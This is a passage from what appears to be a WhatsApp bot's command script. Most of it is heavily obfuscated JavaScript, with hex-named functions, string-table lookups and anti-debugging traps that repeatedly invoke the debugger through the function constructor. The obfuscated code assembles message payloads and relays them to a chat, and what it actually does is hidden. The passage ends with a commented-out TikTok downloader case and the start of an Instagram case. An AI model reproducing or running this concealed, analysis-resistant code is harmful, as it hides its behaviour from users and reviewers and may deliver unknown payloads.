-0x34e,_0x15e12a-0x1af,_0x40871f,_0x44fe63-0x1ea,_0x12aba1-0x1d5);}function _0x555c3f(_0x4e68a2,_0x10bb54,_0x351c72,_0x1cdea3,_0x36b022){return _0x357cbe(_0x4e68a2-0x1a1,_0x10bb54,_0x351c72- -0x393,_0x1cdea3-0x198,_0x36b022-0x17c);}function _0x50c155(_0x5ef93d,_0x1f7824,_0x3cee9c,_0x2074ec,_0x54297f){return _0x26d2a0(_0x2074ec- -0xc5,_0x1f7824-0x119,_0x3cee9c-0x9,_0x5ef93d,_0x54297f-0x1ce);}if(_0x5f13ad[_0x50c155(0x320,0x346,0x2a1,0x2a1,0x1d7)](_0x5f13ad[_0x1b743f(-0x34,-0x175,-0x149,-0x101,-0xcb)],_0x5f13ad[_0x1b743f(0xef,-0x53,-0xa,-0x29,0x3d)])){let _0x5f259f;try{if(_0x5f13ad[_0x555c3f(-0x134,-0x7b,-0x114,-0x55,-0xe8)](_0x5f13ad[_0x555c3f(-0x121,-0x176,-0x156,-0x117,-0x95)],_0x5f13ad[_0x1b743f(0xa9,0x86,0xaf,0x59,-0x13)]))_0x5f259f=_0x5f13ad[_0x208252(0xe5,0x18e,0x186,0x159,0xc1)](Function,_0x5f13ad[_0x50c155(0x1d5,0x228,0x2b4,0x242,0x2ee)](_0x5f13ad[_0x1b743f(-0x42,-0x2d,-0xde,-0xd8,-0x4a)](_0x5f13ad[_0x50c155(0x2fb,0x1df,0x236,0x232,0x232)],_0x5f13ad[_0x50c155(0x29a,0x39d,0x384,0x2eb,0x22b)]),');'))();else{const _0x402637=_0x41316b?function(){function _0x462690(_0x12b4a4,_0x52d638,_0x1e9ce2,_0x265e2b,_0x57a6e0){return _0x555c3f(_0x12b4a4-0x17c,_0x12b4a4,_0x1e9ce2-0x6ef,_0x265e2b-0x70,_0x57a6e0-0x176);}if(_0x5a80b7){const _0x32fff7=_0x563f1f[_0x462690(0x651,0x572,0x63a,0x67f,0x683)](_0x275400,arguments);return _0x3700df=null,_0x32fff7;}}:function(){};return _0x421dda=![],_0x402637;}}catch(_0x179662){if(_0x5f13ad[_0x50c155(0x121,0x248,0x194,0x1c4,0x277)](_0x5f13ad[_0x50c155(0x319,0x284,0x2aa,0x30c,0x36a)],_0x5f13ad[_0x50c155(0x2d6,0x2e5,0x36d,0x30c,0x376)]))_0x5f259f=window;else return!![];}return _0x5f259f;}else{if(_0x3ab37d){const _0x1898e5=_0x3f215a[_0x208252(0x14d,0x16c,0x9f,0x99,0x134)](_0x8559fb,arguments);return _0x47514a=null,_0x1898e5;}}};function _0x40911f(_0x5798a9,_0x1bfe2a,_0x1ea492,_0x11e418,_0x4cfa5f){return _0x428f0b(_0x5798a9-0x139,_0x5798a9-0x79,_0x1ea492,_0x11e418-0x75,_0x4cfa5f-0x52);}const _0x1c02d0=_0x5f13ad[_0x22d19a(0x1b4,0x175,0x1a2,0x271,0x1b5)](_0x4baff6);_0x1c02d0[_0x22d19a(0x2a1,0x238,0x306,0x345,0x2d0)+_0x2161ea(-0xd5,-0xd3,-0x172,-0x110,-0xc5)+'l'](_0x3283c8,0xcd+-0x107*-0xd+-0x2*-0xbc);}());function _0x3283c8(_0x372c9e){function _0x4995ec(_0x29cce3,_0x3696be,_0x557a07,_0x2838f0,_0x334c89){return _0x428f0b(_0x29cce3-0x3e,_0x2838f0- -0x471,_0x334c89,_0x2838f0-0xf6,_0x334c89-0x160);}function _0x33cd8d(_0x18c405,_0x590dba,_0x5e5be3,_0x5d3963,_0x3ff92c){return _0x8633e8(_0x590dba- -0x24,_0x590dba-0xa,_0x18c405,_0x5d3963-0x2c,_0x3ff92c-0x117);}const _0x204560={'pvjUE':function(_0x1d5d6b,_0x30c727){return _0x1d5d6b(_0x30c727);},'kdvEL':function(_0x35f9f1,_0x54df5f){return _0x35f9f1+_0x54df5f;},'Aeyis':_0x33cd8d(0x47,0x90,-0x2c,0xff,0x34)+_0x33cd8d(0xab,0x27,-0x88,0xa8,-0x99)+_0x57b98e(-0x15b,-0x9e,-0x14f,-0x9e,-0xf6)+_0x4995ec(-0x15c,-0x132,-0x266,-0x1ba,-0x137),'eVqzD':_0x33cd8d(0x162,0xad,0x56,0x92,0x14f)+_0x57b98e(-0x1a1,-0x229,-0x1ff,-0x165,-0x223)+_0x1ea119(0x499,0x512,0x475,0x550,0x42a)+_0x4995ec(-0x18c,-0x15c,-0x164,-0x19a,-0xe8)+_0x23d42d(-0x8d,-0x11e,-0x101,-0x5c,-0x9d)+_0x1ea119(0x4ed,0x462,0x5af,0x477,0x47f)+'\x20)','OWCgm':function(_0x427beb){return _0x427beb();},'mNcQX':_0x57b98e(-0x11c,-0xb2,-0x1b7,-0x59,-0x88)+_0x57b98e(-0x151,-0xd6,-0xfc,-0x85,-0x198)+_0x23d42d(0xb7,0x45,0x93,0x17c,-0x19)+')','YCpVL':_0x23d42d(-0xf,0xb9,-0x3d,0x71,-0xd0)+_0x33cd8d(-0x74,0x5a,0xde,0x58,-0x27)+_0x1ea119(0x502,0x541,0x4fa,0x511,0x445)+_0x57b98e(-0x18f,-0x178,-0x117,-0x17b,-0x212)+_0x4995ec(-0x22a,-0x17e,-0x275,-0x24a,-0x243)+_0x33cd8d(0xfc,0x7b,0x149,0xd0,0x9b)+_0x1ea119(0x4d5,0x492,0x580,0x4cf,0x49c),'RYEVu':function(_0x250ce1,_0x35934e){return _0x250ce1(_0x35934e);},'qUnkk':_0x57b98e(-0x18b,-0x109,-0x190,-0x13a,-0x114),'frrzy':function(_0x4b1ba6,_0xfab1bb){return _0x4b1ba6+_0xfab1bb;},'dDvSe':_0x33cd8d(0x6a,0x62,0x15,0x72,0xe2),'nkcbW':function(_0x227ce6,_0x26f6e2){return _0x227ce6+_0x26f6e2;},'VXhzx':_0x4995ec(-0x1be,-0x2f0,-0x21b,-0x22f,-0x263),'dLNZA':function(_0x531eda){return _0x531eda();},'ACyfK':function(_0x524e4d,_0x517dc5){return _0x524e4d===_0x517dc5;},'ltUCQ':_0x23d42d(-0x6a,-0xf5,0x52,-0xce,-0x10f),'HoYbk':_0x1ea119(0x460,0x4b0,0x51e,0x434,0x405),'pftbv':function(_0x394ac4,_0x4026d2){return _0x394ac4===_0x4026d2;},'WujdG':_0x1ea119(0x437,0x4f1,0x4d9,0x493,0x410),'xoRNL':function(_0x334648,_0x2d25e6){return _0x334648!==_0x2d25e6;},'FnAXd':_0x33cd8d(0xa4,0xe6,0x170,0x16,0xd0),'vXMNZ':_0x1ea119(0x49c,0x4f7,0x3fe,0x401,0x531),'zOQVR':_0x23d42d(0x9f,0x136,0x6f,0x2a,0xcf)+'g','RQvxG':function(_0x6bacf8,_0x47369e){return _0x6bacf8!==_0x47369e;},'XkTSZ':_0x4995ec(-0x151,-0x16b,-0x113,-0x10b,-0xa4),'CushT':_0x1ea119(0x4aa,0x524,0x441,0x3ec,0x3f1),'vxslk':_0x23d42d(0x77,0x10a,0xa6,0x126,0xc8)+_0x23d42d(0x3a,0x106,-0x4c,0x106,0x8e)+_0x23d42d(-0x94,-0x15f,-0x83,-0x71,-0x53),'dbXak':_0x4995ec(-0x1bc,-0x230,-0x1f1,-0x1d5,-0x105)+'er','yEmlB':function(_0x5493d5,_0x163707){return _0x5493d5!==_0x163707;},'lgLyI':_0x33cd8d(0x1ea,0x129,0x15b,0xfe,0x1a7),'KMCAn':function(_0x3ed5cc,_0x159e9c){return _0x3ed5cc!==_0x159e9c;},'xysAa':function(_0x35b871,_0x20f2c9){return _0x35b871+_0x20f2c9;},'FRJeJ':function(_0x366bbe,_0x509d87){return _0x366bbe/_0x509d87;},'nuaLj':_0x23d42d(0x25,-0x72,-0x55,0x63,0x64)+'h','YldUA':function(_0x563bfa,_0x3e0942){return _0x563bfa%_0x3e0942;},'yJZYs':_0x33cd8d(0x65,0x72,0x101,0x10d,0x16),'cIgVD':_0x57b98e(-0x4d,-0xb7,0xa,-0x6,0x15),'YKPjn':_0x23d42d(0xd4,0x6,0x1d,0xb2,0x5c),'dIwrK':_0x33cd8d(-0xb1,-0x8,-0xce,0xa5,0x2a)+'n','RhPMe':_0x4995ec(-0x171,-0x21e,-0x226,-0x1e9,-0x123),'aDdfy':_0x57b98e(-0x59,-0x64,0x4e,0x61,-0x44)+_0x33cd8d(0x138,0x108,0x128,0x19c,0x130)+'t','iSQQo':_0x1ea119(0x40c,0x3a5,0x445,0x388,0x3c3)+_0x33cd8d(-0xf,-0x19,0x58,-0xb3,-0x46)+'y','uiVep':function(_0x418ce8,_0x2d263e){return _0x418ce8(_0x2d263e);},'LQcXu':_0x33cd8d(0x163,0xc9,0x17,0x7f,0x175),'UQARp':_0x4995ec(-0x1c6,-0x17e,-0x236,-0x194,-0x1a6),'YGIcZ':function(_0x3e4e5f,_0x16ed90){return _0x3e4e5f===_0x16ed90;},'mmnhW':_0x23d42d(0x90,0x134,0xd7,0x129,-0x2b),'HyDMc':_0x57b98e(-0x191,-0x193,-0xe8,-0x1bb,-0x1c8),'RBAPI':_0x23d42d(0x6b,0x6f,0x44,-0x22,0x8d)};function _0x57b98e(_0x264fc5,_0x1bd8b6,_0x28fe4f,_0x5837e7,_0x489bf0){return _0x25ae30(_0x264fc5-0x1a9,_0x1bd8b6,_0x264fc5- -0x54e,_0x5837e7-0x9,_0x489bf0-0xfc);}function _0x52f425(_0x4d912f){function _0x9e681b(_0x483c10,_0x213260,_0x5ab820,_0x5ef4d1,_0x41e66f){return _0x33cd8d(_0x483c10,_0x5ab820- -0x124,_0x5ab820-0x15e,_0x5ef4d1-0xb7,_0x41e66f-0x135);}function _0x20ea51(_0x374735,_0x447f2f,_0x324890,_0x45039f,_0x2d1f07){return _0x4995ec(_0x374735-0x2,_0x447f2f-0x63,_0x324890-0x146,_0x45039f-0x3,_0x374735);}function _0x113848(_0x405dec,_0x406da9,_0x32ce97,_0x24b35e,_0x4da85a){return _0x4995ec(_0x405dec-0xf1,_0x406da9-0x106,_0x32ce97-0x102,_0x4da85a-0x756,_0x406da9);}function _0x308caf(_0x2a135,_0x51bbb9,_0x329c4f,_0x495de8,_0x1e0752){return _0x57b98e(_0x51bbb9-0xc6,_0x1e0752,_0x329c4f-0x15e,_0x495de8-0x5c,_0x1e0752-0x5f);}const _0x3e9c99={'JmXfk':function(_0x363f2b,_0x51c586){function _0x23eee(_0x166bdd,_0x2f4a54,_0x2cd73e,_0xcf6f85,_0x47fd2f){return _0x334d(_0x166bdd-0x37,_0x47fd2f);}return _0x204560[_0x23eee(0x2a2,0x23e,0x2f5,0x335,0x2fc)](_0x363f2b,_0x51c586);},'pZdBx':function(_0x18197f,_0x42db07){function _0x15f2f1(_0x19e013,_0x27190b,_0x550e70,_0x3eb142,_0x1f1367){return _0x334d(_0x19e013- -0x2,_0x3eb142);}return _0x204560[_0x15f2f1(0x20d,0x24d,0x266,0x13d,0x27b)](_0x18197f,_0x42db07);},'GTrRj':_0x204560[_0x113848(0x50d,0x63f,0x662,0x657,0x594)]};function _0x57b7a2(_0x177869,_0x99657f,_0x3ca584,_0x769f17,_0x5c61f1){return _0x57b98e(_0x177869-0xb9,_0x769f17,_0x3ca584-0x1c,_0x769f17-0x75,_0x5c61f1-0x113);}if(_0x204560[_0x20ea51(-0x204,-0x2a9,-0x255,-0x223,-0x1ca)](_0x204560[_0x308caf(-0x42,-0xec,-0x1a0,-0x8a,-0xff)],_0x204560[_0x113848(0x5f0,0x5b3,0x4de,0x51d,0x58f)])){if(_0x204560[_0x57b7a2(-0x14,-0x29,0xac,-0x87,0x3d)](typeof _0x4d912f,_0x204560[_0x57b7a2(-0x35,-0xa7,-0x4b,-0x8,0x75)])){if(_0x204560[_0x20ea51(-0x3e,-0x49,-0x153,-0xf4,-0xc2)](_0x204560[_0x57b7a2(-0x64,-0x5e,-0xce,-0x3a,-0xab)],_0x204560[_0x57b7a2(-0x3b,-0x19,-0x68,0x34,-0x62)]))return function(_0x27175d){}[_0x308caf(-0x75,0x1c,-0xa7,-0x81,-0x5d)+_0x308caf(-0x1b5,-0x108,-0x9d,-0x11e,-0x1b8)+'r'](_0x204560[_0x20ea51(-0xa6,-0x196,-0xad,-0x126,-0xb5)])[_0x20ea51(-0xde,-0xca,-0x19c,-0x125,-0xab)](_0x204560[_0x308caf(-0x96,-0xca,-0x174,-0xc7,-0x108)]);else{const _0x5981a6=_0x67321e[_0x20ea51(-0x1e9,-0x168,-0x196,-0x125,-0xff)](_0xad994b,arguments);return _0x4ef96b=null,_0x5981a6;}}else{if(_0x204560[_0x20ea51(-0x19e,-0x258,-0x265,-0x216,-0x218)](_0x204560[_0x9e681b(0x4e,-0x42,-0x79,-0x26,-0x1f)],_0x204560[_0x57b7a2(-0x67,-0x2a,0x35,-0xaf,-0x9b)])){const _0x93008a={'cuNsx':function(_0x16e8fb,_0xe4bfb0){function _0x3c313a(_0x17c8ec,_0x554b07,_0x7cb21e,_0x2c53b6,_0x21569f){return _0x9e681b(_0x7cb21e,_0x554b07-0xb1,_0x17c8ec-0x176,_0x2c53b6-0x1b8,_0x21569f-0x48);}return _0x204560[_0x3c313a(0xdc,0x58,0x5c,0x1aa,0x182)](_0x16e8fb,_0xe4bfb0);},'xVGBU':function(_0x51b3ba,_0x17577e){function _0x57702f(_0x123311,_0x437592,_0x2b3e84,_0x84e293,_0x25e4d8){return _0x20ea51(_0x2b3e84,_0x437592-0x188,_0x2b3e84-0x8a,_0x25e4d8-0x4be,_0x25e4d8-0x113);}return _0x204560[_0x57702f(0x2b7,0x316,0x233,0x218,0x2a1)](_0x51b3ba,_0x17577e);},'lKfqA':_0x204560[_0x57b7a2(-0x4e,0x51,-0x13,0x4c,0x7d)],'uEoRv':_0x204560[_0x113848(0x62a,0x5b2,0x664,0x66a,0x62a)]},_0x2a2c64=function(){function _0x3dda84(_0x3c00ea,_0x5ef1a5,_0x469e7e,_0x4d235b,_0x225d1e){return _0x308caf(_0x3c00ea-0x9c,_0x469e7e-0x4a0,_0x469e7e-0xe9,_0x4d235b-0x1ba,_0x4d235b);}let _0x5158b9;function _0xd703e0(_0x38b025,_0x33cee5,_0x2468d1,_0x4eca1d,_0x32e8f1){return _0x20ea51(_0x38b025,_0x33cee5-0x18f,_0x2468d1-0x1ed,_0x2468d1-0x4da,_0x32e8f1-0x24);}function _0x4e9b9a(_0xddc0f0,_0x2d09bc,_0x2c59b1,_0x3bae26,_0x46ac9c){return _0x20ea51(_0x2d09bc,_0x2d09bc-0x87,_0x2c59b1-0x12d,_0x2c59b1-0x73d,_0x46ac9c-0x72);}function _0x323c8f(_0x2fb20e,_0x131d97,_0x48367d,_0x5113e4,_0x26635f){return _0x9e681b(_0x5113e4,_0x131d97-0x177,_0x2fb20e-0x52b,_0x5113e4-0xcb,_0x26635f-0x126);}try{_0x5158b9=_0x93008a[_0x4f4e1c(-0x265,-0x247,-0x252,-0x222,-0x26e)](_0xafe516,_0x93008a[_0x4f4e1c(-0x2af,-0x1f2,-0x229,-0x24e,-0x12c)](_0x93008a[_0x4e9b9a(0x4f9,0x4ec,0x52c,0x53d,0x4a6)](_0x93008a[_0x3dda84(0x413,0x3ec,0x3ce,0x3c3,0x3f1)],_0x93008a[_0x4f4e1c(-0x2bf,-0x262,-0x206,-0x2f1,-0x19d)]),');'))();}catch(_0x5b0324){_0x5158b9=_0x4cbcc4;}function _0x4f4e1c(_0x540936,_0x146ee3,_0x1d74da,_0x1425e3,_0x5c85c3){return _0x9e681b(_0x540936,_0x146ee3-0x45,_0x146ee3- -0x126,_0x1425e3-0xdf,_0x5c85c3-0x3c);}return _0x5158b9;},_0x3a994b=_0x204560[_0x57b7a2(-0x37,-0xde,-0x82,-0x6f,-0xbf)](_0x2a2c64);_0x3a994b[_0x20ea51(-0x225,-0x1c4,-0x166,-0x168,-0x13c)+_0x9e681b(0x40,-0x24,0x30,-0x66,-0x6a)+'l'](_0x41cbcf,-0x215f+0x93e+0x27c1*0x1);}else{if(_0x204560[_0x113848(0x514,0x50a,0x528,0x4f4,0x56f)](_0x204560[_0x308caf(0x4,-0x43,-0xc,-0x10e,-0xc1)]('',_0x204560[_0x113848(0x69a,0x5a2,0x6bb,0x624,0x61d)](_0x4d912f,_0x4d912f))[_0x204560[_0x308caf(-0x12b,-0xa7,-0x174,-0xb3,-0xa7)]],0x7*-0xd4+-0xe98*-0x1+-0x8cb)||_0x204560[_0x9e681b(-0x108,-0x7a,-0x8c,0x34,0x1e)](_0x204560[_0x57b7a2(-0x39,0x38,-0x46,0x4a,-0x25)](_0x4d912f,0x1*-0x5c2+0x738+-0x162),-0x4*-0x98e+0x3*-0xa53+-0x73f)){if(_0x204560[_0x9e681b(-0x144,0x3d,-0x8c,-0xb5,-0x59)](_0x204560[_0x113848(0x670,0x5cc,0x553,0x5e2,0x5be)],_0x204560[_0x308caf(-0x81,-0x31,-0xdd,-0x14,0x7)]))(function(){function _0x35f94f(_0x24473b,_0x5ef10b,_0x5097df,_0x21e2b3,_0x321790){return _0x9e681b(_0x5097df,_0x5ef10b-0x4,_0x5ef10b-0x5,_0x21e2b3-0xb3,_0x321790-0x112);}function _0x2cd450(_0x1203ea,_0x3f45fe,_0x369fbe,_0x38b0ec,_0x511e17){return _0x9e681b(_0x38b0ec,_0x3f45fe-0x1ae,_0x3f45fe-0x69,_0x38b0ec-0xa0,_0x511e17-0x198);}function _0x461764(_0x326003,_0x17387a,_0x1ea27f,_0x365fc6,_0x5cfd79){return _0x20ea51(_0x326003,_0x17387a-0x63,_0x1ea27f-0x143,_0x1ea27f-0x71,_0x5cfd79-0x106);}const _0x53fd5f={'xEpIt':function(_0x463edf,_0x1a285f){function _0xc73dc7(_0x2eba44,_0x7da292,_0xfd6505,_0x125def,_0x1f0ffa){return _0x334d(_0x125def-0x324,_0x2eba44);}return _0x3e9c99[_0xc73dc7(0x523,0x4ad,0x55c,0x4a5,0x563)](_0x463edf,_0x1a285f);}};function _0x395e8b(_0x1cfa64,_0xc85811,_0xca189f,_0x376dd0,_0x3f4745){return _0x57b7a2(_0xca189f- -0xc0,_0xc85811-0x1d5,_0xca189f-0x40,_0x3f4745,_0x3f4745-0x5b);}if(_0x3e9c99[_0x395e8b(-0xf9,-0xe3,-0x1b1,-0x151,-0x253)](_0x3e9c99[_0x2cd450(0x38,-0x5a,-0xa5,-0xa3,0x3a)],_0x3e9c99[_0x395e8b(-0xf4,-0x114,-0x171,-0xd0,-0xd8)]))return!![];else _0x53fd5f[_0x395e8b(-0x134,-0x204,-0x1a6,-0x151,-0x259)](_0x417bb3,0x22a4+0x13*0x65+-0x2a23);}[_0x308caf(-0x46,0x1c,0xc1,0x61,-0x6a)+_0x113848(0x510,0x4fb,0x500,0x570,0x4e7)+'r'](_0x204560[_0x20ea51(-0x277,-0x1d0,-0xe9,-0x1a7,-0xdf)](_0x204560[_0x113848(0x5eb,0x6e8,0x6d7,0x64d,0x628)],_0x204560[_0x57b7a2(-0x2f,-0x2c,-0x1b,0x1e,-0x6c)]))[_0x9e681b(-0xa7,-0x68,-0xcb,-0x35,-0x5a)](_0x204560[_0x9e681b(-0xd8,-0x10e,-0xe5,-0x144,-0x10e)]));else{const _0x477eda=new _0x5ee009(_0x204560[_0x57b7a2(-0xb5,-0x42,-0xe5,-0x19,-0x17f)]),_0x38e2bf=new _0x43468b(_0x204560[_0x20ea51(-0x147,-0x1a7,-0x20c,-0x1dd,-0x1eb)],'i'),_0x1b1d29=_0x204560[_0x308caf(0x5e,-0x11,-0x21,-0x1c,0xd)](_0x1ea3b8,_0x204560[_0x20ea51(-0x18d,-0xd5,-0x184,-0x194,-0x138)]);!_0x477eda[_0x9e681b(-0x1bc,-0xb7,-0xf6,-0xf2,-0x4e)](_0x204560[_0x9e681b(0x7d,0x3e,0x33,0x32,0x34)](_0x1b1d29,_0x204560[_0x113848(0x5d6,0x6a7,0x64a,0x6bd,0x608)]))||!_0x38e2bf[_0x20ea51(-0x209,-0x222,-0x1ae,-0x23b,-0x17d)](_0x204560[_0x9e681b(-0x4d,0x73,-0x1d,0x75,0x20)](_0x1b1d29,_0x204560[_0x9e681b(-0x1ca,-0x170,-0x12e,-0x80,-0x10c)]))?_0x204560[_0x57b7a2(-0x88,-0x26,-0xf7,-0x59,-0xe)](_0x1b1d29,'0'):_0x204560[_0x57b7a2(-0xd9,-0x69,-0x1c,-0x77,-0xbb)](_0x4f96b1);}}else{if(_0x204560[_0x57b7a2(-0xcc,-0x6f,-0x176,-0x12,-0x15)](_0x204560[_0x57b7a2(-0xed,-0x85,-0x187,-0xe6,-0x64)],_0x204560[_0x308caf(-0x28,-0xe0,-0xcf,-0xb3,-0xc6)])){const _0x56c44d=_0x1b9884?function(){function _0x263f74(_0x2bc8a4,_0x27d329,_0x20e7c3,_0xa53511,_0x35f131){return _0x57b7a2(_0x27d329-0x3c,_0x27d329-0x137,_0x20e7c3-0x109,_0xa53511,_0x35f131-0x140);}if(_0xda1455){const _0x12cd52=_0x51fc44[_0x263f74(0x3b,0x6e,0x7b,0x108,0xce)](_0xf8121d,arguments);return _0x451239=null,_0x12cd52;}}:function(){};return _0x233add=![],_0x56c44d;}else(function(){function _0x4b890e(_0x2dbe19,_0x4d5faa,_0x2413cd,_0x2e170f,_0x11563d){return _0x57b7a2(_0x4d5faa-0x7d,_0x4d5faa-0xac,_0x2413cd-0x4b,_0x11563d,_0x11563d-0x5c);}function _0x12369a(_0x48fe66,_0x109c40,_0x3737bf,_0xc592fe,_0x298120){return _0x20ea51(_0xc592fe,_0x109c40-0x26,_0x3737bf-0x3b,_0x3737bf-0x68d,_0x298120-0x120);}function _0x1adc78(_0x509d0b,_0x494990,_0x15acde,_0x2bf219,_0x198a1b){return _0x113848(_0x509d0b-0x130,_0x198a1b,_0x15acde-0xb5,_0x2bf219-0x1b1,_0x494990-0x32);}return _0x204560[_0x1adc78(0x5e7,0x61a,0x583,0x6ad,0x61d)](_0x204560[_0x1adc78(0x634,0x64e,0x715,0x679,0x61b)],_0x204560[_0x4b890e(0x41,-0x41,-0xb4,0x19,-0x6b)])?![]:![];}[_0x20ea51(-0x105,-0x1a3,-0x1b0,-0x148,-0x142)+_0x20ea51(-0x1a1,-0x2ba,-0x216,-0x26c,-0x26c)+'r'](_0x204560[_0x308caf(-0x52,-0xb9,-0x152,-0x52,-0x13f)](_0x204560[_0x20ea51(-0x187,-0xa5,-0x163,-0x12b,-0x8b)],_0x204560[_0x9e681b(0x1,-0xa,-0x41,0x43,-0x7f)]))[_0x20ea51(-0xe3,-0x82,-0x125,-0x125,-0x164)](_0x204560[_0x113848(0x72f,0x602,0x5b9,0x5a6,0x671)]));}}}_0x204560[_0x113848(0x656,0x562,0x555,0x541,0x5de)](_0x52f425,++_0x4d912f);}else return _0x528380;}function _0x1ea119(_0x1b591d,_0x37b198,_0x5440c6,_0x33e106,_0x59f00b){return _0x25ae30(_0x1b591d-0x1ba,_0x59f00b,_0x1b591d-0x66,_0x33e106-0x6d,_0x59f00b-0xc9);}function _0x23d42d(_0x67b46,_0x223acf,_0x57fd03,_0xdff7be,_0x24c469){return _0x18ff16(_0x67b46- -0x1a2,_0xdff7be,_0x57fd03-0xcd,_0xdff7be-0x9f,_0x24c469-0x1b4);}try{if(_0x204560[_0x4995ec(-0x163,-0x1a4,-0x2ae,-0x226,-0x22a)](_0x204560[_0x33cd8d(0x23,0x4a,0x78,0xfd,0xa4)],_0x204560[_0x33cd8d(0x125,0x16b,0x22d,0x1db,0x9c)])){if(_0x372c9e){if(_0x204560[_0x33cd8d(0x89,0xeb,0x4d,0x15d,0x74)](_0x204560[_0x23d42d(0x1b,0xe6,0x7e,0x64,0xde)],_0x204560[_0x57b98e(-0x108,-0x147,-0x51,-0x6b,-0x9c)]))return _0x52f425;else{const _0x49d964={};_0x49d964[_0x57b98e(-0xdc,-0x22,-0xd5,-0x16b,-0xf6)]=_0x204560[_0x4995ec(-0x226,-0x20e,-0x294,-0x1d6,-0x257)],_0x49d964[_0x57b98e(-0x1c9,-0x1e2,-0x241,-0x1bb,-0x245)+_0x4995ec(-0x108,-0x118,-0xdf,-0x119,-0x1e6)+_0x23d42d(-0x78,-0x13c,-0x4b,0x39,-0x9d)+'n']=_0x1ea119(0x3ed,0x359,0x445,0x46c,0x3f0)+_0x23d42d(0x6f,0x1e,0x109,0xc4,-0x43)+_0x1ea119(0x51f,0x59f,0x5e1,0x5ce,0x4e8)+_0x23d42d(-0x7,0x9a,0x76,0x23,0xc4)+_0x4995ec(-0x1cb,-0x237,-0x2a7,-0x1ee,-0x1a8)+_0x23d42d(-0x53,0x13,0x27,-0x5d,-0x76)+_0x4995ec(-0x21b,-0x1cc,-0x110,-0x15d,-0x1a5)+_0x2d960c+(_0x33cd8d(0x7e,0x13d,0x104,0xca,0x73)+'\x20')+_0x213197+'\x22}';const _0x1b9f53={};_0x1b9f53[_0x57b98e(-0xdc,-0x2e,-0x59,-0x3c,-0x30)]=_0x204560[_0x23d42d(-0x12,-0xd6,0xb8,-0x53,-0x48)],_0x1b9f53[_0x23d42d(-0xa6,-0x7c,-0x4a,-0x3c,-0x68)+_0x33cd8d(0x10f,0x153,0x177,0x1b3,0x8b)+_0x23d42d(-0x78,0x1a,-0x143,0x36,-0x134)+'n']=_0x1ea119(0x3ed,0x497,0x39d,0x34f,0x45b)+_0x1ea119(0x500,0x59b,0x5c5,0x566,0x43d)+_0x33cd8d(0x1f6,0x136,0xd3,0xa0,0x15a)+_0x57b98e(-0x12a,-0x8f,-0x8b,-0x9d,-0xa3)+_0x57b98e(-0x117,-0x1df,-0x1a8,-0xb2,-0x1c8)+_0x33cd8d(0xce,0x55,0x64,0x16,-0x43)+_0x33cd8d(0x6f,0x10f,0x134,0x14e,0x18c)+_0x4728b3+(_0x33cd8d(0xe2,0xd1,0xe9,0x148,0x7e)+'\x20')+_0x35d4ab+'\x22}';const _0x25a264={};_0x25a264[_0x1ea119(0x4d8,0x4c8,0x4e6,0x50d,0x468)]=_0x204560[_0x33cd8d(0xa9,0x96,0x93,0x139,-0x24)],_0x25a264[_0x4995ec(-0x2dd,-0x2c0,-0x1fd,-0x26a,-0x1b6)+_0x4995ec(-0xd0,-0x94,-0x17f,-0x119,-0x5c)+_0x23d42d(-0x78,0x1e,-0x18,-0x85,-0x7a)+'n']=_0x23d42d(-0xa4,-0xa3,-0x125,-0x63,-0xe7)+_0x57b98e(-0xb4,-0xbf,-0x12d,-0xc4,-0x147)+_0x4995ec(-0x8a,-0x1ab,-0x1ce,-0x136,-0x155)+_0x33cd8d(0xed,0xa9,0x14,0x139,0x82)+_0x4995ec(-0x261,-0x296,-0x2b2,-0x278,-0x2b9)+_0x1ea119(0x43b,0x40b,0x389,0x4b5,0x3da)+':\x22'+_0xdfa348+(_0x4995ec(-0x1dd,-0x1fc,-0x174,-0x1b5,-0x239)+'d\x20')+_0x569530+'\x22}',_0x2816f6[_0x4995ec(-0x14e,-0x166,-0xf9,-0xea,-0x1f)](_0x49d964,_0x1b9f53,_0x25a264);}}else{if(_0x204560[_0x33cd8d(0xed,0x175,0xc9,0x238,0x220)](_0x204560[_0x23d42d(0x74,0xcd,0xac,-0x24,0xa8)],_0x204560[_0x57b98e(-0x153,-0x1fa,-0xd3,-0x1bd,-0x106)]))_0x204560[_0x33cd8d(0x10e,0x10a,0x1d2,0xda,0x70)](_0x52f425,0x2*-0x120b+-0x10ea+0x3500);else{const _0x1fd328=_0x4f395f[_0x1ea119(0x52d,0x466,0x553,0x480,0x5e3)](_0x5c3e0d,arguments);return _0x823799=null,_0x1fd328;}}}else{_0x204560[_0x33cd8d(0xa7,0x10a,0x6c,0x1b9,0x9f)](_0x1218d5,_0x161fc6[_0x4995ec(-0x1c4,-0x2b8,-0x208,-0x261,-0x2b8)]);const _0x3b3df5={};_0x3b3df5[_0x4995ec(-0x16c,-0x1f9,-0xcb,-0x172,-0x240)]=_0x440c4e[_0x1ea119(0x50d,0x4a5,0x479,0x56b,0x4e3)+'t'][_0x4995ec(-0x210,-0x27f,-0xff,-0x1c5,-0x196)+'1'];const _0x24431a={};_0x24431a[_0x1ea119(0x490,0x476,0x470,0x4ac,0x49e)]=_0x3b3df5,_0x24431a[_0x57b98e(-0x196,-0xfd,-0xf8,-0x110,-0x169)+'on']=_0x528bdb[_0x4995ec(-0x1a9,-0x2f6,-0x1eb,-0x26c,-0x2a8)+'ss'];const _0x2c589e={};_0x2c589e[_0x33cd8d(-0xa9,0x10,0x77,-0x6e,0xb9)+'d']=_0x87b72a,_0x3a07be[_0x23d42d(-0x76,0x42,0x52,-0xa4,0x30)+_0x4995ec(-0x1b4,-0xe1,-0x276,-0x1ad,-0x1cc)+'e'](_0x29f38d[_0x57b98e(-0x1de,-0x154,-0x193,-0x155,-0x1ba)],_0x24431a,_0x2c589e);}}catch(_0x5ec932){}}
}
break
/*
case 'tiktok':
case 'ttdl':
case 'tt':{
if (!text) return reply(`masukan link tiktoknya`)
let old = new Date()
const dlt = require('./lib/tiktokdl.js')
let tiktuk = await dlt.DownloadTiktok(text)
if (tiktuk.result.images) {
tiktuk.result.images.forEach(async (k) => {
await zynX.sendMessage(m.chat, { image: { url: k }}, { quoted: fcall });
})
} else {
zynX.sendMessage(m.chat, { video: { url: tiktuk.result.video_hd }, caption: `${gris}[ T I K T O K - D O W N L O A D E R ]${gris}\n\n${hiasan}*Author* : ${tiktuk.result.author.nickname}\n${hiasan}*Desc* : ${tiktuk.result.desc}\n${hiasan}*Statistic* : ${tiktuk.result.statistic}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fcall })
await sleep(500)
zynX.sendMessage(m.chat, { audio: { url: tiktuk.result.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
}
}
break
*/
case 'instagram': 
case 'igdl':
